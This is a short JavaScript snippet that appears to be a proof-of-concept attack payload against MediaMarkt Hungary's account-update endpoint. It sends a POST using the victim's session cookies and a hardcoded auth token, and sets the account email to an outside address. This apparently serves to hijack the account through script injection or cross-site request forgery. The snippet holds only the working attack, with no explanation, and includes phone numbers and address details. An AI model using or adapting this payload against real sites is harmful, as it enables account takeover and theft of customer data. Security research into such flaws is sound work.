let email = `grabisch@mediamarktsaturn.com`;

fetch('https://www.mediamarkt.hu/webapp/wcs/stores/servlet/MultiChannelMAMasterDataUpdate', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: `storeId=19801&langId=-19&addressType=billing&URL=https%3A%2F%2Fwww.mediamarkt.hu%2Fwebapp%2Fwcs%2Fstores%2Fservlet%2FMultiChannelMAMasterDataUpdate&demographicField4=0&isB2BAddress=false&authToken=pofuigovjom6indf7b85o6d3s4&personTitle=Mr&lastName=Test&firstName=Test&displayName=Test+D.&businessTitle=Andr%C3%A1ssy+%C3%BA&zipCode=1062&city=+Budapest&address1=+rue+des+doumbe&address3=22&streetType=k%C3%B6r%C3%BAt&address2=22+rue+des+doumbe&country=Franciaorsz%C3%A1g&phone2=%2B33782830011&phone1=%2B36782830897&birthdayYear=1999&birthdayMonth=10&birthdayDay=16&email1=${email}`
});
